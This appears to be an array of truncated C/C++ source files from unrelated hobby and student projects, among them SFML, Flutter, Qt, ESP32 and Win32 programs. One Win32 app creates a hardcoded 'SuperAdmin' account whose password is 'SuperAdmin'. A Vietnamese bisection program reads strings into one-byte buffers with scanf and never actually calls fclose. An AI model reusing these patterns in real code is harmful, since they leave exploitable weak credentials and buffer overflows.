videoStorage.size(); ++i) {\n        const auto frames = persistors[i].getDescriptorInfo();\n        for (const auto& frame : frames) {\n            indices.push_back(VideoIndex(static_cast<uint16_t>(i), frame.frame, -1));\n        }\n    }\n\n    std::sort(indices.begin(), indices.end());\n    return indices;\n}\n\nstd::string& Catalog::getVideoPath(const uint32_t index) {\n    return videoPaths[index];\n}\n\nstd::string& Catalog::getVideoPath(const VideoIndex& index) {\n    return videoPaths[index.video];\n}\n\nint Catalog::getVideoID(const std::string& name) {\n    for (int i = 0; i < videoNames.size(); ++i) {\n        if (videoNames[i] == name) {\n            return i;\n        }\n    }\n    return -1;\n}\n\nstd::vector<cv::KeyPoint> Catalog::getImageKeyPoints(const VideoIn",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Graphics.hpp>\n#include <algorithm>\n#include <sstream>\n#include <iomanip>\n#include <string>\n#include <map>\n\n\nnamespace\n{\n    struct JoystickObject\n    {\n        sf::Text label;\n        sf::Text value;\n    };\n\n    typedef std::map<std::string, JoystickObject> Texts;\n    Texts texts;\n    std::ostringstream sstr;\n    float threshold = 0.1f;\n\n    // Axes labels in as C strings\n    const char* axislabels[] = {\"X\", \"Y\", \"Z\", \"R\", \"U\", \"V\", \"PovX\", \"PovY\"};\n\n    // Helper to set text entries to a specified value\n    template<typename T>\n    void set(const char* label, const T& value)\n    {\n        sstr.str(\"\");\n        sstr << value;\n        texts[label].value.setString(sstr.str());\n    }\n\n    // Update joystick identification\n    void updateIdentification(unsigned int index)\n    {\n        sstr.str(\"\");\n        sstr << \"Joystick \" << index << \":\";\n        texts[\"ID\"].label.setString(sstr.str());\n        texts[\"ID\"].value.setString(sf::Joystick::getIdentification(index).name);\n    }\n\n    // Update joystick axes\n    void updateAxes(unsigned int index)\n    {\n        for (unsigned int j = 0; j < sf::Joystick::AxisCount; ++j)\n        {\n            if (sf::Joystick::hasAxis(index, static_cast<sf::Joystick::Axis>(j)))\n                set(axislabels[j], sf::Joystick::getAxisPosition(index, static_cast<sf::Joystick::Axis>(j)));\n        }\n    }\n\n    // Update joystick buttons\n    void updateButtons(unsigned int index)\n    {\n        for (unsigned int j = 0; j < sf::Joystick::getButtonCount(index); ++j)\n        {\n            sstr.str(\"\");\n            sstr << \"Button \" << j;\n\n            set(sstr.str().c_str(), sf::Joystick::isButtonPressed(index, j));\n        }\n    }\n\n    // Helper to update displayed joystick values\n    void updateValues(unsigned int index)\n    {\n        if (sf::Joystick::isConnected(index)) {\n            // Update the label-value sf::Text objects based on the current joystick state\n            updateIdentification(index);\n            updateAxes(index);\n            updateButtons(index);\n        }\n    }\n}\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    // Create the window of the application\n    sf::RenderWindow window(sf::VideoMode(400, 775), \"Joystick\", sf::Style::Close);\n    window.setVerticalSyncEnabled(true);\n\n    // Load the text font\n    sf::Font font;\n    if (!font.loadFromFile(\"resources/tuffy.ttf\"))\n        return EXIT_FAILURE;\n\n    // Set up our string conversion parameters\n    sstr.precision(2);\n    sstr.setf(std::ios::fixed | std::ios::boolalpha);\n\n    // Set up our joystick identification sf::Text objects\n    texts[\"ID\"].label.setPosition(5.f, 5.f);\n    texts[\"ID\"].value.setPosition(80.f, 5.f);\n\n    texts[\"ID\"].label.setString(\"<Not Connected>\");\n    texts[\"ID\"].value.setString(\"\");\n\n    // Set up our threshold sf::Text objects\n    sstr.str(\"\");\n    sstr << threshold << \"  (Change with up/down arrow keys)\";\n\n    texts[\"Threshold\"].label.setPosition(5.f, 5.f + 2 * font.getLineSpacing(14));\n    texts[\"Threshold\"].value.setPosition(80.f, 5.f + 2 * font.getLineSpacing(14));\n\n    texts[\"Threshold\"].label.setString(\"Threshold:\");\n    texts[\"Threshold\"].value.setString(sstr.str());\n\n    // Set up our label-value sf::Text objects\n    for (unsigned int i = 0; i < sf::Joystick::AxisCount; ++i)\n    {\n        JoystickObject& object = texts[axislabels[i]];\n\n        object.label.setPosition(5.f, 5.f + (static_cast<float>(i + 4) * font.getLineSpacing(14)));\n        object.label.setString(std::string(axislabels[i]) + \":\");\n\n        object.value.setPosition(80.f, 5.f + (static_cast<float>(i + 4) * font.getLineSpacing(14)));\n        object.value.setString(\"N/A\");\n    }\n\n    for (unsigned int i = 0; i < sf::Joystick::ButtonCount; ++i)\n    {\n        sstr.str(\"\");\n        sstr << \"Button \" << i;\n        JoystickObject& object = texts[sstr.str()];\n\n        object.label.setPosition(5.f, 5.f + (static_cast<float>(sf::Joystick::AxisCount + i + 4) * font.getLineSpacing(14)));\n        object.label.setString(sstr.str() + \":\");\n\n        object.value.setPosition(80.f, 5.f + (static_cast<float>(sf::Joystick::AxisCount + i + 4) * font.getLineSpacing(14)));\n        object.value.setString(\"N/A\");\n    }\n\n    for (Texts::iterator it = texts.begin(); it != texts.end(); ++it)\n    {\n        it->second.label.setFont(font);\n        it->second.label.setCharacterSize(14);\n        it->second.label.setFillColor(sf::Color::White);\n\n        it->second.value.setFont(font);\n        it->second.value.setCharacterSize(14);\n        it->second.value.setFillColor(sf::Color::White);\n    }\n\n    // Update initially displayed joystick values if a joystick is already connected on startup\n    for (unsigned int i = 0; i < sf::Joystick::Count; ++i)\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include\"MyWnds.h\"\n\nint WINAPI _tWinMain(_In_ HINSTANCE _hInstance, _In_opt_ HINSTANCE hPreInstance, _In_ LPTSTR lpCmdLine, _In_ INT nShowCmd)\n{\n\t//\u63a5\u6536\u5e94\u7528\u7a0b\u5e8f\u7684\u5f53\u524d\u5b9e\u4f8b\u7684\u53e5\u67c4\n\tMyWnds::hInstance = _hInstance;\n\t//\u82e5\u6ca1\u6709\u7528\u6237\u4fe1\u606f\uff0c\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u8d85\u7ea7\u7ba1\u7406\u5458\n\tHANDLE tempHANDLE = CreateFile(_T(\"Account.dat\"), GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);\n\tif (tempHANDLE != INVALID_HANDLE_VALUE) {\n\t\tAccount writeAct;\n\t\t_stprintf_s(writeAct.mName , _T(\"\u8d85\u7ea7\u7ba1\u7406\u5458\"));\n\t\t_stprintf_s(writeAct.mID, _T(\"SuperAdmin\"));\n\t\t_stprintf_s(writeAct.mPasswd, _T(\"SuperAdmin\"));\n\t\twriteAct.mPer.mAdmin = superPer;\n\t\twriteAct.mCredit = 0;\n\t\t//\u83b7\u53d6\u7cfb\u7edf\u65f6\u95f4\n\t\tSYSTEMTIME sysTime;\n\t\tGetLocalTime(&sysTime);\n\t\t_stprintf_s(writeAct.mRegTime.mDate, _T(\"%04d-%02d-%02d\"), sysTime.wYear, sysTime.wMonth, sysTime.wDay);\n\t\t_stprintf_s(writeAct.mRegTime.mMoment, _T(\"%02d:%02d:%02d\"), sysTime.wHour, sysTime.wMinute, sysTime.wSecond);\n\t\t++Account::mCount;\n\t\tDWORD written;\n\t\tWriteFile(tempHANDLE, &writeAct, sizeof(Account),&written, NULL);\n\t\tCloseHandle(tempHANDLE);//\u5173\u95ed\u6587\u4ef6\n\t}\n\treturn MyWnds::MainWnd();\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                }\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "/**\n * @file frame_and_data.cpp\n * @brief Creation of JSON frame containing sensor data\n * @date 2024-04-05\n * @author Izukend\n */\n\n#include \"../../include/frame_and_data.h\" // Including necessary libraries\n\n/**\n * @brief Function to create the JSON frame containing sensor data\n * \n * This function creates a JSON object to store temperature, humidity,\n * CO2 data, and the MAC address of the ESP32. The data is retrieved from\n * the corresponding sensor recovery functions.\n * \n * @return The JSON frame containing sensor data\n */\nString createJSONMessage() {\n    // Create a JSON object to store data\n    StaticJsonDocument<200> jsonDoc;\n\n    // Add data to the JSON object\n    jsonDoc[\"esp32_mac\"] = WiFi.macAddress(); // Add ESP32 MAC address\n    jsonDoc[\"temperature\"] = recoverTemp(); // Add temperature\n    delay(200); // Wait for a short delay to avoid concurrent reading issues\n    jsonDoc[\"humidity\"] = recoverHum(); // Add humidity\n    jsonDoc[\"co2\"] = recoverCO2Data(); // Add CO2 data\n\n    // Convert the JSON object to JSON string\n    String jsonString;\n    serializeJson(jsonDoc, jsonString);\n\n    return jsonString; // Return the JSON frame\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"client\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"SendWindow.h\"\r\n#include <QPainter>\r\n#include <QDebug>\r\n#include <QColorDialog>\r\n\r\nSendWindow::SendWindow(QWidget *parent) : QMainWindow(parent), drawing(false) {\r\n    setWindowTitle(\"Send Window\");\r\n    image = QImage(size(), QImage::Format_ARGB32_Premultiplied);\r\n    image.fill(Qt::white);\r\n    //paintColor = Qt::black;\r\n\r\n    clearButton = new QPushButton(\"Clear\", this);\r\n    clearButton->move(10, 10);\r\n    connect(clearButton, &QPushButton::clicked, this, &SendWindow::clearDrawing);\r\n}\r\n\r\nvoid SendWindow::drawLine(const QPoint& startPos, const QPoint& endPos, const QColor& color) {\r\n    QPainter painter(&image);\r\n    painter.setPen(QPen(color, 2));\r\n    painter.drawLine(startPos, endPos);\r\n    update();\r\n}\r\n\r\nvoid SendWindow::serializeImage(){\r\n    QByteArray imageData;\r\n    QDataStream stream(&imageData, QIODevice::WriteOnly);\r\n    stream << this->image;\r\n    emit imageSent(imageData);\r\n}\r\n\r\nvoid SendWindow::mousePressEvent(QMouseEvent *event) {\r\n    if (event->button() == Qt::LeftButton) { //left click to draw\r\n        drawing = true;\r\n        lastPos = event->pos();\r\n        startPos = lastPos; // Update the start position of the line\r\n    }\r\n}\r\n\r\nvoid SendWindow::mouseMoveEvent(QMouseEvent *event) {\r\n    if ((event->buttons() & Qt::LeftButton) && drawing) {\r\n        //draw the last position of the line as the mouse moving\r\n        drawLine(lastPos, event->pos(), Qt::blue);\r\n        lastPos = event->pos();\r\n        //data serialization\r\n        serializeImage();\r\n    }\r\n}\r\n\r\nvoid SendWindow::mouseReleaseEvent(QMouseEvent *event) {\r\n    if (event->button() == Qt::LeftButton && drawing) { //release left click to stop drawing\r\n        drawing = false;\r\n    }\r\n}\r\n\r\nvoid SendWindow::paintEvent(QPaintEvent *event) {\r\n    QMainWindow::paintEvent(event);\r\n    QPainter painter(this);\r\n    painter.drawImage(0, 0, image);\r\n}\r\n\r\nvoid SendWindow::clearDrawing() {\r\n    image.fill(Qt::white);\r\n    update();\r\n    emit clearSignal(); // Emit the clearSignal when drawing is cleared\r\n}\r\n",
    "#include <iostream>\r\n#include <filesystem>\r\n#include <vector>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string.h>\r\n#include <string_view>\r\n#include <algorithm>\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD);\r\n\r\nstd::string removeCarriageReturn(std::string str)\r\n{\r\n  str.erase(std::remove(str.begin(), str.end(), '\\r'), str.end());\r\n  return str;\r\n}\r\nbool is_number(const std::string &s)\r\n{\r\n  std::string::const_iterator it = s.begin();\r\n  while (it != s.end() && std::isdigit(*it))\r\n    ++it;\r\n  return !s.empty() && it == s.end();\r\n}\r\nstd::string replaceString(std::string subject, const std::string &search, const std::string &replace)\r\n{\r\n  size_t pos = subject.find(search);\r\n  while (pos != std::string::npos)\r\n  {\r\n    subject.replace(pos, search.length(), replace);\r\n    pos = subject.find(search, pos + replace.length());\r\n  }\r\n  return subject;\r\n}\r\nbool string_contains(std::string input, std::string key)\r\n{\r\n  if (input.find(key) != std::string::npos)\r\n  {\r\n    return true;\r\n  }\r\n  return false;\r\n}\r\nstd::vector<std::string> split(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    pos_start = pos_end + delim_len;\r\n    res.push_back(token);\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\nstd::vector<std::string> split_first(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  if ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    res.push_back(token);\r\n    pos_start = pos_end + delim_len;\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\n\r\nint main()\r\n{\r\n  int option_range = 0;\r\n  std::cout << \"##################\\nosuTo2007 v1.6\\nosu! : _Railgun_\\nDiscord : @railgun_osu\\n##################\\n\\n\";\r\n  std::vector<std::filesystem::path> map_list;\r\n  for (const auto &entry : std::filesystem::directory_iterator(std::filesystem::current_path()))\r\n  {\r\n    if (entry.path().extension() == \".osu\")\r\n    {\r\n      map_list.push_back(entry.path());\r\n    }\r\n  }\r\n  if (map_list.size() == 0)\r\n  {\r\n    std::cout << \"No .osu files found\\nExiting...\";\r\n    return 0;\r\n  }\r\n  else\r\n  {\r\n    std::cout << \"Choose which .osu file you want to convert to v3:\\n\\n\";\r\n    if (map_list.size() > 1)\r\n    {\r\n      std::cout << \"0 = All listed below\\n\";\r\n    }\r\n    for (size_t i = 1; i - 1 < map_list.size(); i++)\r\n    {\r\n      std::cout << i << \" = \" << map_list[i - 1].filename() << \"\\n\";\r\n      option_range++;\r\n    }\r\n  }\r\nopt:\r\n  std::cout << \"Choose an option:\\n\";\r\n  std::string input;\r\n  std::cin >> input;\r\n  if (!is_number(input))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt;\r\n  }\r\n  if (!(std::stoi(input) < option_range + 1))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt;\r\n  }\r\n  bool keep_OD;\r\nopt2:\r\n  std::cout << \"Because in v3 AR(ApproachRate) is tied to OD(OverallDifficulty):\\nOD = AR\\nDo you prefer to have:\\n1 = same OverallDifficulty (map might be hard to read)\\n2 = same ApproachRate (map might be hard to acc)\\n\";\r\n  std::string input2;\r\n  std::cin >> input2;\r\n  if (!is_number(input2))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt2;\r\n  }\r\n  if ((std::stoi(input2) < 1) || (std::stoi(input2) > 2))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt2;\r\n  }\r\n  if (input2 == \"1\")\r\n  {\r\n    keep_OD = true;\r\n  }\r\n  else\r\n  {\r\n    keep_OD = false;\r\n  }\r\n  if (std::stoi(input) == 0)\r\n  {\r\n    for (int i = 0; i < map_list.size(); i++)\r\n    {\r\n      downgradeOsuFile(map_list[i], keep_OD);\r\n    }\r\n  }\r\n  else\r\n  {\r\n    downgradeOsuFile(map_list[std::stoi(input) - 1], keep_OD);\r\n  }\r\n  return 0;\r\n}\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD)\r\n{\r\n  // predefined keys to search for\r\n  static std::vector<std::string> general_Var = {\"AudioFilename\", \"PreviewTime\", \"SampleSet\"};\r\n  static std::vector<std::string> metaData_Var = {\"Title\", \"Artis\", \"Creator\", \"Version\"};\r\n  static std::vector<std::string> difficulty_Var = {\"HPDrainRate\", \"CircleSize\", \"OverallDifficulty\", \"ApproachRate\", \"SliderMultiplier\", \"SliderTickRate\"};\r\n\r\n  // current filename\r\n  std::string fileName = \"(converted) \" + filePath.filename().string();\r\n\r\n  // osu file format version\r\n  std::string fileFormat = \"\";\r\n  std::string OD_line = \"\";\r\n  std::string AR_line = \"\";\r\n  std::vector<std::pair<std::string, std::string>> general, metadata, difficulty;\r\n  std::vector<std::string> events, timingPoints, hitObjects;\r\n  bool skip = false;\r\n  int section = 0;\r\n  std::cout << \"Downgrading \" << filePath.filename() << \" to v3 file format...\\n\";\r\n  std::ifstream file(filePath);\r\n  if (file.is_open())\r\n  {\r\n    std::string line;\r\n\r\n  ",
    "#include \"../headers/database_manager.hpp\"\n\nDatabaseManager::DatabaseManager(QWidget *parent) {\n    this->parent = parent;\n    model = new QSqlQueryModel();\n}\n\nvoid DatabaseManager::createDatabaseBackup(const QString& backupFilePath) {\n    if (db.isOpen()) {\n        db.close();\n    }\n    QFile::remove(backupFilePath);\n    QFile::copy(db.databaseName(), backupFilePath);\n    if (!db.open()) {\n        QMessageBox::critical(parent, \"Error\", \"Failed to reopen database after creating backup\");\n        return;\n    }\n}\n\nbool DatabaseManager::openDatabase(const QString& filePath, bool autoBackup) {\n    db = QSqlDatabase::addDatabase(\"QSQLITE\");\n    db.setDatabaseName(filePath);\n    bool ok = db.open();\n    if (ok && autoBackup) {\n        createDatabaseBackup(filePath + \".bak\");\n    }\n    return ok;\n}\n\nvoid DatabaseManager::loadModel() {\n    model->setQuery(\"SELECT * FROM jobs\");\n    if (model->lastError().isValid()) {\n        QMessageBox::critical(parent, \"Error\", \"Error: \" + model->lastError().text());\n    }\n}\n\nvoid DatabaseManager::closeDatabase() {\n    db.close();\n    QSqlDatabase::removeDatabase(\"QSQLITE\");\n}\n\nbool DatabaseManager::createJobsTableIfNotExists() {\n    QSqlQuery query(db);\n    return query.exec(\"CREATE TABLE IF NOT EXISTS jobs (\"\n                      \"id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n                      \"job_title TEXT,\"\n                      \"company TEXT,\"\n                      \"status TEXT,\"\n                      \"application_date TEXT,\"\n                      \"url_email TEXT,\"\n                      \"details TEXT,\"\n                      \"is_finished BOOLEAN DEFAULT 0\"\n                      \");\");\n}\n\nvoid DatabaseManager::updateStatus(int id, const QString& status) {\n    {\n        QSqlQuery query(db);\n        query.prepare(\"UPDATE jobs SET status = :status, is_finished = :is_finished WHERE id = :id\");\n        query.bindValue(\":status\", status);\n        query.bindValue(\":id\", id);\n        static std::vector<QString> finishedStatus = {\"Finished\", \"Done\", \"Complete\", \"Rejected\", \"Approved\"};\n        bool isFinished = std::find(finishedStatus.begin(), finishedStatus.end(), status) != finishedStatus.end();\n        query.bindValue(\":is_finished\", isFinished);\n        if (!query.exec()) {\n            QMessageBox::critical(parent, \"Error\", \"Failed to update status\");\n            return;\n        }\n    }\n    loadModel();\n    QMessageBox::information(parent, \"Success\", \"Status updated successfully\");\n}\n\nvoid DatabaseManager::exportDatabase() {\n    QString fileName = QFileDialog::getSaveFileName(nullptr, \"Export Database\", QDir::homePath() + \"/database.db\", \"SQLite Database (*.db)\");\n    if (fileName.isEmpty()) {\n        return;\n    }\n    QFile file(fileName);\n    if (file.exists()) {\n        if (!file.remove()) {\n            QMessageBox::critical(parent, \"Error\", \"Error: Failed to remove existing file.\");\n            return;\n        }\n    }\n    QSqlDatabase exportDb = QSqlDatabase::addDatabase(\"QSQLITE\", \"export\");\n    exportDb.setDatabaseName(fileName);\n    if (!exportDb.open()) {\n        QMessageBox::critical(parent, \"Error\", \"Error: \" + exportDb.lastError().text());\n        return;\n    }\n    {\n        QSqlQuery createTableQuery(exportDb);\n        if (!createTableQuery.exec(\"CREATE TABLE IF NOT EXISTS jobs (\"\n                                   \"id INTEGER PRIMARY KEY AUTOINCREMENT,\"\n                                   \"job_title TEXT,\"\n                                   \"company TEXT,\"\n                                   \"status TEXT,\"\n                                   \"application_date TEXT,\"\n                                   \"url_email TEXT,\"\n                                   \"details TEXT,\"\n                                   \"is_finished BOOLEAN DEFAULT 0\"\n                                   \");\")) {\n            QMessageBox::critical(parent, \"Error\", \"Error: \" + createTableQuery.lastError().text());\n            exportDb.close();\n            return;\n        }\n        QSqlQuery insertQuery(exportDb);\n        for (int row = 0; row < model->rowCount(); ++row) {\n            QSqlRecord record = model->record(row);\n            insertQuery.prepare(\"INSERT INTO jobs (job_title, company, status, application_date, url_email, details, is_finished) \"\n                                \"VALUES (:job_title, :company, :status, :application_date, :url_email, :details, :is_finished)\");\n            insertQuery.bindValue(\":job_title\", record.value(\"job_title\"));\n            insertQuery.bindValue(\":company\", record.value(\"company\"));\n            insertQuery.bindValue(\":status\", record.value(\"status\"));\n            insertQuery.bindValue(\":application_date\", record.value(\"application_date\"));\n            insertQuery.bindValue(\":url_email\", record.value(\"url_email\"));\n            insertQuery.bindValue(\":details\", record.value(\"details\"));\n            insertQuery.bindValue(\":is_finished\", record.value(\"is_finished\"));\n            if (!insertQuery.exec()) {\n                QMessageBox::critical(parent, \"Error\", \"Error: \" +",
    "#undef NDEBUG\r\n#include <iostream>\r\n#include <cassert>\r\n#include <fstream>\r\n#include <cstdint>\r\n#include <cstdlib>\r\n#include <vector>\r\n\r\ninline static char* findFirst(char* str, char c)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (*_c == c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c == *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c != *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (!f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\n#pragma pack(2)\r\nstruct String\r\n{\r\n\tchar* start;\r\n\tuint16_t length;\r\n\r\n\ttemplate <typename T>\r\n\tinline T applyAsNormalString(T f(const char*)) const\r\n\t{\r\n\t\tchar ei = start[length];\r\n\t\tstart[length] = '\\0';\r\n\t\tT v = f(start);\r\n\t\tstart[length] = ei;\r\n\t\treturn v;\r\n\t}\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tfor (uint16_t i = 0; i < length; i++)\r\n\t\t\tputchar(start[i]);\r\n\t}\r\n\r\n\tinline long long toInt() const\r\n\t{\r\n\t\treturn 